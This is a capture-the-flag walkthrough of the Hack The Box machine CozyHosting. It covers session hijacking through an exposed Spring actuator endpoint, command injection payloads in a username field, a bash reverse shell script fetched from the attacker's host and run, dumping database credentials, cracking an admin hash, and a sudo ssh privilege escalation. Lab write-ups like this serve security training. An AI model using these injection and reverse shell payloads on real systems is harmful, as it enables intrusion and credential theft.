# [CozyHosting](https://app.hackthebox.com/machines/cozyhosting)


```bash
nmap -p- --min-rate 10000 10.10.11.230 -Pn
```

![alt text](img/image.png)

After detection of open ports, let's do greater nmap scan here.

```bash
nmap -A -sC -sV -p22,80 10.10.11.230 -Pn 
```

![alt text](img/image-1.png)


From nmap scan result, `cozyhosting.htb` domain name is resolved to this ip address, that's why I add this record into `/etc/hosts` file.

While browsing web application, it returns such an web page.

![alt text](img/image-2.png)


From `tech stack`, I see that `Spring` application is, that's why I use specific wordlist while fuzzing for `directories`.

Let's do `Directory Enumeration` via `feroxbuster` command.
```bash
feroxbuster -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt 
```

![alt text](img/image-3.png)


There's endpoint `/actuator/sessions` which shows current sessions and are so sensitive.

```bash
curl -s http://cozyhosting.htb/actuator/sessions | jq .
```

![alt text](img/image-4.png)


Let's use this session on web application via `JSESSIONID` key and refresht the webpage.

![alt text](img/image-5.png)


I am already on `Admin` dashboard.

I find this below feature where I can submit `IP Address` as hostname and username.

![alt text](img/image-6.png)


Let's see full HTTP request headers and body for this feauture.

![alt text](img/image-7.png)


Let's check `Command Injection` payloads for `username` parameter.

```bash
host=10.10.14.18&username=dr4ks;{ping,-c,1,10.10.14.18};
```

![alt text](img/image-8.png)


I can see this from `tcpdump` that `Command Injection` worked.

![alt text](img/image-9.png)


Now, I will do `Blind Command Injection`.


So, first I will create `.sh` file which contains `reverse shell` payload.

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.18/1337 0>&1
```

![alt text](img/image-10.png)

Now, I will open http.server as below.
```bash
python3 -m http.server --bind 10.10.14.18 8080
```

![alt text](img/image-12.png)

Third, I make a `Command Injection` payload which makes `curl` to my http.server to download `.sh` file.
```bash
host=localhost&username=dr4ks%3bcurl${IFS}http://10.10.14.18:8080/dr4ks.sh${IFS}-o${IFS}/tmp/dr4ks.sh
```

![alt text](img/image-11.png)



Now, it's time to run this malicious script as below.
```bash
host=localhost&username=dr4ks%3bbash${IFS}/tmp/dr4ks.sh
```

![alt text](img/image-13.png)


Hola!, I got reverse shell from port `1337`.

![alt text](img/image-14.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo;fg
export TERM=xterm
export SHELL=bash
```

![alt text](img/image-15.png)


I look at machine to find interesting stuff. I find `cloudhosting-0.0.1.jar` file on `/app` directory.


Let's download this and try to find sensitive info.

For this, I will open http.server to serve this file.
```bash
python3 -m http.server --bind 10.10.11.230 8080
```

![alt text](img/image-16.png)


I get this file from http.server via `wget` command.
```bash
wget http://10.10.11.230:8080/cloudhosting-0.0.1.jar
```

![alt text](img/image-17.png)


I look at this file via `jd-gui` which is `Java Decompiler`.

![alt text](img/image-18.png)


I find `PostgreSQL` credentials from `application.properties` file.

postgres: Vg&nvzAQ7XxR


Let's connect into `Postgre` Server.
```bash
PGPASSWORD='Vg&nvzAQ7XxR' psql -U postgres -h localhost
```

![alt text](img/image-19.png)


I find credentials from `users` table.

![alt text](img/image-20.png)


admin: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm


Let's crack this hash via `hashcat`.

```bash
hashcat -m 3200 hash.txt --wordlist /usr/share/wordlists/rockyou.txt
```

![alt text](img/image-21.png)


admin: manchesterunited


I check this password for `josh` user.

user.txt

![alt text](img/image-22.png)


For `Privilege Escalation`, I just run `sudo -l` command to see privileges of this user.

![alt text](img/image-23.png)


I see `ssh` binary, I find `privesc payload` on [Gtfobins](https://gtfobins.github.io/gtfobins/ssh/#sudo).


root.txt

![alt text](img/image-24.png)